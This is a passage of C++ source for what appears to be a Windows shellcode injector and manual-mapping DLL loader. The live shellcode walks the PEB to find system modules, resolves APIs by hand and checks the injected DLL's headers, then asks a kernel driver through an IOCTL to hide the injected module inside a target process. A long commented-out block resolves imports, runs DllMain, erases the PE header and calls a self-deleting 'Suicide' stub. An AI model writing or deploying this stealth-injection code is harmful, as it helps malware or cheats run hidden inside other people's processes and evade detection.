    //             LOG_W(L"OFT RVA: 0x%X, IAT RVA: 0x%X. pINT at 0x%p, pIAT at 0x%p", rvaOFT, rvaIAT, pImportNameTable, pImportAddressTable);

    //             UINT SuccessImportResolution = 0, FailImportResolution = 0;
    //             while(pImportAddressTable->u1.AddressOfData != 0)
    //             {
    //                 FARPROC resolvedFunctionAddress = NULL;
    //                 ULONGLONG currentThunkValue = pImportNameTable->u1.Function;

    //                 if(IMAGE_SNAP_BY_ORDINAL(currentThunkValue))
    //                 {
    //                     WORD ordinalToImport = (WORD)IMAGE_ORDINAL(currentThunkValue);
    //                     //LOG_W(L"  Attempting to import by Ordinal: %d", ordinalToImport);

    //                     resolvedFunctionAddress = (FARPROC)(ShellcodeFindExportAddress(reinterpret_cast<HMODULE>(hDependentdll), (LPCSTR)ordinalToImport, my_LoadLibraryA));

    //                     if (!resolvedFunctionAddress)
    //                     {
    //                         LOG_W(L"FAILED to resolve Ordinal %d from %hs", ordinalToImport, dllNameString);
    //                         ++FailImportResolution;
    //                     }
    //                     else
    //                     {
    //                         LOG_W(L"Resolved Ordinal %d to 0x%p", ordinalToImport, (void*)resolvedFunctionAddress);
    //                         ++SuccessImportResolution;
    //                     }
    //                 }
    //                 else    // Importing by Name
    //                 {

    //                     // u1.AddressOfData contains RVA to IMAGE_IMPORT_BY_NAME structure
    //                     DWORD rvaImportByName = (DWORD)pImportAddressTable->u1.AddressOfData;
    //                     IMAGE_IMPORT_BY_NAME* pImportByName = (IMAGE_IMPORT_BY_NAME*)(pResources->Injected_dll_base + rvaImportByName);

    //                     char* functionName = pImportByName->Name;
                        
    //                     //LOG_W(L"Attempting to import by Name: '%hs'", functionName);
    //                     resolvedFunctionAddress = (FARPROC)(ShellcodeFindExportAddress(reinterpret_cast<HMODULE>(hDependentdll), functionName, my_LoadLibraryA));

    //                     if (!resolvedFunctionAddress)
    //                     {
    //                         LOG_W(L"[[FAILED]] to resolve Name '%hs' from %hs", functionName, dllNameString);
    //                         ++FailImportResolution;
                            
    //                     }
    //                     else
    //                     {
    //                         LOG_W(L"Resolved Name '%hs' to 0x%p", functionName, (void*)resolvedFunctionAddress);
    //                         ++SuccessImportResolution;
    //                     }
    //                 }

    //                 pImportAddressTable->u1.Function = (ULONGLONG)resolvedFunctionAddress;
                    
    //                 ++pImportNameTable;
    //                 ++pImportAddressTable;
    //             }
                
    //             LOG_W(L"DLL-> [%hs] Success[%d] Fail[%d]------\n", dllNameString, SuccessImportResolution, FailImportResolution);

    //             ++pDesc;
    //         }
    //         LOG_W(L"\nAll import descriptors processed");
    //     }
    //     LOG_W(L"            Import Resolution Finished\n-----------------------------------------------------------");  
    //     #pragma endregion

    //     //==========================================================================================

    //     #pragma region Call DLLMain

    //     LOG_W(L"            Call DllMain");

    //     HANDLE hTargetProcessHeap = nullptr;
    //     BYTE* pPEB_bytes = (BYTE*)pPEB;

    //     hTargetProcessHeap = (HANDLE)(*(PDWORD_PTR)(pPEB_bytes + 0x30));
    //     LOG_W(L"Located the Target Process heap at -> 0x%p", (void*)hTargetProcessHeap);

    //     void* vpAllocatedHeap = my_RtlAllocateHeap(hTargetProcessHeap, HEAP_ZERO_MEMORY, sizeof(DLLMAIN_THREAD_PARAMS));
    //     if(!vpAllocatedHeap) {LOG_W(L"[!!!!] Could not allocate the heap [!!!!]"); return;}

    //     PDLLMAIN_THREAD_PARAMS pHeapParams = reinterpret_cast<PDLLMAIN_THREAD_PARAMS>(vpAllocatedHeap);


    //     DWORD rvaOfEntryPoint = pOptionalHeader_injected_dll->AddressOfEntryPoint;
    //     if (rvaOfEntryPoint == 0) LOG_W(L"DLL has no entry point. Skipping DllMain call.");
    //     else
    //     {
    //         pfnDLLMain pfnDllMain = (pfnDLLMain)(pResources->Injected_dll_base + rvaOfEntryPoint);
    //         LOG_W(L"Calculated DllMain address: 0x%p", (void*)pfnDllMain);

    //         pHeapParams->pfnDllMain = pfnDllMain;
    //         pHeapParams->hinstDLL = (HINSTANCE)pResources->Injected_dll_base;
    //         pHeapParams->vpAllocatedHeap = vpAllocatedHeap;
    //         pHeapParams->pRtlFreeHeap = my_RtlFreeHeap;
    //         pHeapParams->vpTarget_process_Heap = hTargetProcessHeap;

    //         DWORD dwDllMainThreadId = 0; 
    //         LOG_W(L"Creating new thread to execute DllMain (0x%p) via DllMainThreadRunner", (void*)pfnDllMain);
    //         HANDLE hDllMainThread = my_CreateThread(NULL, 0, DllMainThreadRunner, pHeapParams, 0, &dwDllMainThreadId);
    //         if (hDllMainThread)
    //         {
    //             LOG_W(L"DllMain thread launched Thread id-> %d Handle-> 0x%p", dwDllMainThreadId, (void*)hDllMainThread);
    //             my_CloseHandle(hDllMainThread);
    //         }
    //         else
    //         {
    //             LOG_W(L"!!!! FAILED to create thread for DllMain. DLL will not initialize. !!!!");
    //             my_RtlFreeHeap(hTargetProcessHeap, 0, vpAllocatedHeap);
    //         }
    //     }
    //     LOG_W(L"            DllMain Call Attempted\n-----------------------------------------------------------");
    //     #pragma endregion

    //     //==========================================================================================
        
    //     #pragma region ZeroPEHeader

    //     LOG_W(L"            ZeroPEHeader ");

    //     //----------------Fill _CACHED_PROTECTIONS_FOR_REGIONS before zeroing header
    //     IMAGE_SECTION_HEADER* pSectionHeader_injected_dll = IMAGE_FIRST_SECTION(pNtHeader_injected_dll);
    //     WORD noOfSections_Dll = pFileHeader_injected_dll->NumberOfSections;
            
    //     if (noOfSections_Dll > 20)
    //     {
    //         LOG_W(L"  [Cache] Warning: Number of sections (%u) exceeds cache array size (20). Truncating.", noOfSections_Dll);
    //         noOfSections_Dll = 20;
    //     }

    //     __declspec(allocate(".stub")) static CACHED_PROTECTIONS_OF_REGIONS CashedProtectionArray[20];

    //     for(WORD i = 0; i < noOfSections_Dll; ++i)
    //     {
    //         IMAGE_SECTION_HEADER* pCurrentSection = &pSectionHeader_injected_dll[i];

    //         CashedProtectionArray[i].CachedSectionRVA = pCurrentSection->VirtualAddress;
    //         CashedProtectionArray[i].pCachedSectionMemoryBase = pResources->Injected_dll_base + CashedProtectionArray[i].CachedSectionRVA;
    //         CashedProtectionArray[i].CachedSectionVirtualSize = pCurrentSection->Misc.VirtualSize;

    //         for (int k = 0; k < IMAGE_SIZEOF_SHORT_NAME && pCurrentSection->Name[k] != '\0'; ++k) CashedProtectionArray[i].CachedcurrentSectionNameAnsi[k] = (char)pCurrentSection->Name[k];
    //         if(CashedProtectionArray[i].CachedSectionVirtualSize != 0) CashedProtectionArray[i].Cachedcharacteristics = pCurrentSection->Characteristics;
    //     }
    //     IMAGE_DATA_DIRECTORY relocDirEntry = pOptionalHeader_injected_dll->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    //     //----------------Filled _CACHED_PROTECTIONS_FOR_REGIONS

    //     WORD SizeOfHeader_injected_dll = pOptionalHeader_injected_dll->SizeOfHeaders;

    //     my_RtlFillMemory(pResources->Injected_dll_base, SizeOfHeader_injected_dll, 0);
    //     LOG_W(L"Zeroed PE headers from [0x%p] for size [0x%X]", (void*)pResources->Injected_dll_base, SizeOfHeader_injected_dll);
        
    //     DWORD oldHeaderProtect = 0;
    //     if (my_VirtualProtect(pResources->Injected_dll_base, SizeOfHeader_injected_dll, PAGE_NOACCESS, &oldHeaderProtect)) LOG_W(L"PE header protection changed to RW (old=0x%X)", oldHeaderProtect);
    //     else LOG_W(L"Failed to change PE header protection to RW");
        
    //     LOG_W(L"            ZeroPEHeader \n-----------------------------------------------------------");
        
    //     #pragma endregion

    //     //==========================================================================================
        
    //     #pragma region Memory Hardening 

    //     LOG_W(L"            Memory Hardening ");
        
    //     for(UINT i = 0; i < noOfSections_Dll; ++i)
    //     {
    //         BYTE* pSectionMemoryBase = CashedProtectionArray[i].pCachedSectionMemoryBase;
    //         SIZE_T SectionVirtualSize = CashedProtectionArray[i].CachedSectionVirtualSize;

    //         if(SectionVirtualSize == 0) LOG_W(L"Size of section [%hs] is 0, skipping", CashedProtectionArray[i].CachedcurrentSectionNameAnsi);
    //         else
    //         {
    //             // LOG_W(L"Changing protection for '%hs'", CashedProtectionArray[i].CachedcurrentSectionNameAnsi);
    //             DWORD characteristics = CashedProtectionArray[i].Cachedcharacteristics;
    //             int newProtectionFlags = 0;

    //             if(relocDirEntry.VirtualAddress != 0 && CashedProtectionArray[i].CachedSectionRVA == relocDirEntry.VirtualAddress)
    //             {
    //                 newProtectionFlags = PAGE_NOACCESS;
    //                 // LOG_W(L"Section '%hs' (relocation data) setting to PAGE_NOACCESS.", CashedProtectionArray[i].CachedcurrentSectionNameAnsi);
    //             }
    //             else
    //             {
    //                 if (characteristics & IMAGE_SCN_MEM_EXECUTE)
    //                 {
    //                     if (characteristics & IMAGE_SCN_MEM_WRITE) newProtectionFlags = PAGE_EXECUTE_READWRITE;      
    //                     else if (characteristics & IMAGE_SCN_MEM_READ) newProtectionFlags = PAGE_EXECUTE_READ;  // .text
    //                     else newProtectionFlags = PAGE_EXECUTE;
    //                 }
    //                 else if (characteristics & IMAGE_SCN_MEM_WRITE)     //Note: Data sections are often also readable, Windows loader typically maps .data/.bss as RW.
    //                 {
    //                     newProtectionFlags = PAGE_READWRITE;            // .data, .bss
    //                 }
    //                 else if(characteristics & IMAGE_SCN_MEM_READ) newProtectionFlags = PAGE_READONLY;  // .rdata
    //                 else
    //                 {
    //                     newProtectionFlags = PAGE_NOACCESS; // Section with no R, W, or E flags
    //                     LOG_W(L"Section '%hs' has no R/W/E characteristics. Setting to PAGE_NOACCESS.", CashedProtectionArray[i].CachedcurrentSectionNameAnsi);
    //                 }
    //             }

    //             // If for some reason newProtectionFlags is still 0 (e.g., section with only IMAGE_SCN_MEM_WRITE but not READ or EXECUTE, which is odd)
    //             // a default might be applied, but the logic above should cover most cases.
    //             // PAGE_NOACCESS is a safe default if unsure.
    //             if (newProtectionFlags == 0)
    //             {
    //                 LOG_W(L"Section '%hs' resulted in no specific protection flags, defaulting to PAGE_READONLY.", CashedProtectionArray[i].CachedcurrentSectionNameAnsi);
    //                 newProtectionFlags = PAGE_READONLY; // A somewhat safe default
    //             }

    //             DWORD oldProtectionFlags = 0;
    //             if(my_VirtualProtect((LPVOID)pSectionMemoryBase, SectionVirtualSize, newProtectionFlags, &oldProtectionFlags))
    //             {
    //                 LOG_W(L"Section '%hs' (0x%p, size 0x%X) permissions changed: Old=0x%X, New=0x%X", CashedProtectionArray[i].CachedcurrentSectionNameAnsi, (void*)pSectionMemoryBase, SectionVirtualSize, oldProtectionFlags, newProtectionFlags);
    //             }
    //             else LOG_W(L"!!!! FAILED to VirtualProtect section '%hs' (0x%p) to 0x%X !!!!", CashedProtectionArray[i].CachedcurrentSectionNameAnsi, (void*)pSectionMemoryBase, newProtectionFlags);
    //         }
    //     }

    //     int newProtectionFlags = PAGE_READWRITE;
    //     DWORD oldProtectionFlags = 0;
    //     SIZE_T SizeOfShellcodeResources = pResources->Injected_Shellcode_base - pResources->ResourceBase;
    //     if(my_VirtualProtect((LPVOID)pResources->ResourceBase, SizeOfShellcodeResources, newProtectionFlags, &oldProtectionFlags))
    //     {
    //         LOG_W(L"Shellcode Resources permission changed: Old=0x%X, New=0x%X", oldProtectionFlags, newProtectionFlags);
    //     } else LOG_W(L"!!!! FAILED to VirtualProtect Shellcode Resources to 0x%X", newProtectionFlags);

    //     LOG_W(L"            Memory Hardening \n-----------------------------------------------------------");

    //     #pragma endregion

    //     //==========================================================================================
        
    //     #pragma region Suicide
    //     LOG_W(L"            Suicide");

    //     // LARGE_INTEGER delayInterval;
    //     // delayInterval.QuadPart = -10000 * 10000; // 1000 ms = 1 second, negative for relative time
    //     // my_NtDelayExecution(1, &delayInterval);

    //     LOG_W(L"Preparing for self-deletion and exit via assembly suicide stub...");

    //     Suicide(pResources->ResourceBase, my_NtFreeVirtualMemory, my_RtlExitUserThread, my_NtProtectVirtualMemory);

    //     LOG_W(L"!!!! ERROR: Returned from Suicide Stub !!!!");

    //     LOG_W(L"            Suicide\n-----------------------------------------------------------");
    //     #pragma endregion

    //     //==========================================================================================
        
    //     LOG_W(L"[END_OF_SHELLCODE]");
    //     // __debugbreak();
    // }
    #pragma endregion


    __declspec(noinline) void __stdcall shellcode(LPVOID lpParameter)
    {
        #pragma region Shellcode_setup

        struct _LIBS
        {
            HMODULE hHookedNtdll;
            HMODULE hUnhookedNtdll;
            HMODULE hKERNEL32;
            HMODULE hKERNELBASE;
            HMODULE hUsr32;
        }sLibs;

        typedef struct _MY_PEB_LDR_DATA
        {
            ULONG Length;
            BOOLEAN Initialized;
            PVOID  SsHandle;
            LIST_ENTRY InLoadOrderModuleList;
            LIST_ENTRY InMemoryOrderModuleList;
            LIST_ENTRY InInitializationOrderModuleList;
        } MY_PEB_LDR_DATA, *MY_PPEB_LDR_DATA;

        typedef struct _LDR_DATA_TABLE_ENTRY
        {
            LIST_ENTRY InLoadOrderLinks;
            LIST_ENTRY InMemoryOrderLinks;
            LIST_ENTRY InInitializationOrderLinks;
            PVOID DllBase;
            UNICODE_STRING FullDllName;
            UNICODE_STRING BaseDllName;
        } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

        struct _HIDE_MODULE_RESOURCES
        {

            HANDLE hTargetPid;
            PVOID vpInjectedDll_Base; 

        };

        _RESOURCES* pResources = (_RESOURCES*)lpParameter;

        #ifdef _M_IX86
            PEB* pPEB = (PEB*) __readfsdword(0x30);
        #else
            PEB* pPEB = (PEB*) __readgsqword(0x60);   
        #endif
        
        MY_PEB_LDR_DATA* pLdr = (MY_PEB_LDR_DATA*)pPEB->Ldr;
        auto head = &pLdr->InLoadOrderModuleList;
        auto current = head->Flink;
        
        //walk load‑order
        while(current != head)
        {
            auto entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

            if(entry->BaseDllName.Buffer)
            {
                const WCHAR* namePtr;
                SIZE_T nameLen;

                HelperSplitFilename(entry->BaseDllName.Buffer, entry->BaseDllName.Length / sizeof(WCHAR), &namePtr, &nameLen);

                SIZE_T k32len = sizeof(kUsr32)/sizeof(WCHAR) - 1;
                if(nameLen == k32len && isSameW(namePtr, kUsr32, k32len)) sLibs.hUsr32 = (HMODULE)entry->DllBase;

                k32len = sizeof(hKernelbase)/sizeof(WCHAR) - 1;
                if(nameLen == k32len && isSameW(namePtr, hKernelbase, k32len)) sLibs.hKERNELBASE = (HMODULE)entry->DllBase;

                k32len = sizeof(kNtdll)/sizeof(WCHAR) - 1;
                if(nameLen == k32len && isSameW(namePtr, kNtdll, k32len)) sLibs.hHookedNtdll = (HMODULE)entry->DllBase;
            }
            current = current->Flink;
        }
        if(sLibs.hUsr32 == NULL || sLibs.hKERNELBASE == NULL) __debugbreak();
        
        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        my_OutputDebugStringW = (pfnOutputDebugStringW)ShellcodeFindExportAddress(sLibs.hKERNELBASE, cOutputDebugStringWFunction, my_LoadLibraryA);
        if(my_OutputDebugStringW == NULL) __debugbreak();

        my_MessageBoxW = (pfnMessageBoxW)ShellcodeFindExportAddress(sLibs.hUsr32, cMessageBoxWFunction, my_LoadLibraryA);
        if(my_MessageBoxW == NULL) __debugbreak();

        my_LoadLibraryA = (pfnLoadLibraryA)ShellcodeFindExportAddress(sLibs.hKERNELBASE, cLoadLibraryAFunction, my_LoadLibraryA);
        if(my_LoadLibraryA == NULL) __debugbreak();

        my_CloseHandle = (pfnCloseHandle)ShellcodeFindExportAddress(sLibs.hKERNELBASE, cCloseHandleFunction, my_LoadLibraryA);
        if(my_CloseHandle == NULL) __debugbreak();
        
        my_NtDelayExecution = (pfnNtDelayExecution)ShellcodeFindExportAddress(sLibs.hHookedNtdll, cNtDelayExecutionFunction, my_LoadLibraryA);
        if(my_NtDelayExecution == NULL) __debugbreak();

        my_CreateFileW = (pfnCreateFileW)ShellcodeFindExportAddress(sLibs.hKERNELBASE, cCreateFileWFunction, my_LoadLibraryA);
        if(my_CreateFileW == NULL) __debugbreak();

        my_DeviceIoControl = (pfnDeviceIoControl)ShellcodeFindExportAddress(sLibs.hKERNELBASE, cDeviceIoControlFunction, my_LoadLibraryA);
        if(my_DeviceIoControl == NULL) __debugbreak();
        
        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        // __declspec(allocate(".stub")) static const WCHAR INJECTED[] = L"INJECTED"; __declspec(allocate(".stub")) static const WCHAR s2[] = L"Hello from injected shellcode!";
        // // my_MessageBoxW(NULL, s2, INJECTED, MB_OK | MB_TOPMOST);
        // my_OutputDebugStringW(s2);

        __declspec(allocate(".stub")) static const WCHAR s2[] = L"Hello from injected shellcode!";
        ShellcodeSprintfW(g_shellcodeLogBuffer, sizeof(g_shellcodeLogBuffer)/sizeof(WCHAR), s2);
        
        LOG_W(L"[SHELLCODE] //////////////////////////////////////////////////////////\n");
        LOG_W(L"[SHELLCODE] Injected_dll_base -> 0x%p\n", pResources->Injected_dll_base);
        LOG_W(L"[SHELLCODE] Resource_base ->  0x%p\n", pResources->ResourceBase);
        LOG_W(L"[SHELLCODE] Shellcode_base ->  0x%p\n", pResources->Injected_Shellcode_base);
        LOG_W(L"[SHELLCODE] -----------------------------------------------------------\n");

        IMAGE_DOS_HEADER* pDosHeader_injected_dll = (IMAGE_DOS_HEADER*) pResources->Injected_dll_base;
        if(pDosHeader_injected_dll->e_magic != 0x5A4D)
        {
            LOG_W(L"[SHELLCODE] [!!!!] Invalid DOSHeader signature\n");
            return;
        }else LOG_W(L"[SHELLCODE] DOSHeader signature-> 0x%hX [OK]\n", pDosHeader_injected_dll->e_magic);
        
        
        DWORD peOffset_injected_dll = pDosHeader_injected_dll->e_lfanew;
        
        IMAGE_NT_HEADERS* pNtHeader_injected_dll = (IMAGE_NT_HEADERS*)(pResources->Injected_dll_base + peOffset_injected_dll);
        if(pNtHeader_injected_dll->Signature != IMAGE_NT_SIGNATURE)
        {
            LOG_W(L"[SHELLCODE] [!!!!] Invalid NTHeader signature\n");
            return;
        }else LOG_W(L"[SHELLCODE] NTHeader signature-> 0x%X [OK]\n", pNtHeader_injected_dll->Signature);

        IMAGE_OPTIONAL_HEADER* pOptionalHeader_injected_dll = &pNtHeader_injected_dll->OptionalHeader;
        if(pOptionalHeader_injected_dll->Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC)
        {
            LOG_W(L"[SHELLCODE] [!!!!] Invalid OptionalHeader Magic\n");
            return;
        }else LOG_W(L"[SHELLCODE] OptionalHeader Magic-> 0x%X [OK]\n", pOptionalHeader_injected_dll->Magic);

        IMAGE_FILE_HEADER* pFileHeader_injected_dll = (IMAGE_FILE_HEADER*)(&pNtHeader_injected_dll->FileHeader);
        if(pFileHeader_injected_dll->Machine != IMAGE_FILE_MACHINE_AMD64)
        {
            LOG_W(L"[SHELLCODE] [!!!!] Invalid FileHeader Machine type\n");
            return;
        }else LOG_W(L"[SHELLCODE] FileHeader Machine-> 0x%X [OK]\n", pFileHeader_injected_dll->Machine);
        LOG_W(L"[SHELLCODE] -----------------------------------------------------------\n");
        
        #pragma endregion

        //==========================================================================================

        #pragma region Driver_Communication

    // __debugbreak();
        constexpr ULONG HIDE_MODULE_REQUEST = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);

        
        __declspec(allocate(".stub")) static const WCHAR s3[] = L"\\\\.\\baaaa_bae";

        HANDLE hDriver = my_CreateFileW(s3, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if(hDriver == INVALID_HANDLE_VALUE) { LOG_W(L"[SHELLCODE] [!!!!] Failed to open device -> INVALID_HANDLE_VALUE\n");  return; }
        else LOG_W(L"[SHELLCODE] Successfully opened device\n");

        
        __declspec(allocate(".stub")) static _HIDE_MODULE_RESOURCES sHideModuleResourcesStorage = {};
        _HIDE_MODULE_RESOURCES* sHideModuleResources = &sHideModuleResourcesStorage;
        sHideModuleResources->vpInjectedDll_Base = pResources->Injected_dll_base;
        sHideModuleResources->hTargetPid = pResources->TargetPid;


        LOG_W(L"[SHELLCODE] Sending hide request to driver for PID: %p\n", sHideModuleResources->hTargetPid);
        DWORD bytes_returned = 0;
        BOOL success = my_DeviceIoControl(hDriver, HIDE_MODULE_REQUEST, sHideModuleResources, 16, nullptr, 0, &bytes_returned, nullptr);
        if (success) LOG_W(L"[SHELLCODE] Driver acknowledged the request successfully!\n");
        else LOG_W(L"[SHELLCODE] [!!!!] Driver returned an error for the request.\n");

        my_CloseHandle(hDriver);
        #pragma endregion
    }

#pragma code_seg(pop)
#pragma endregion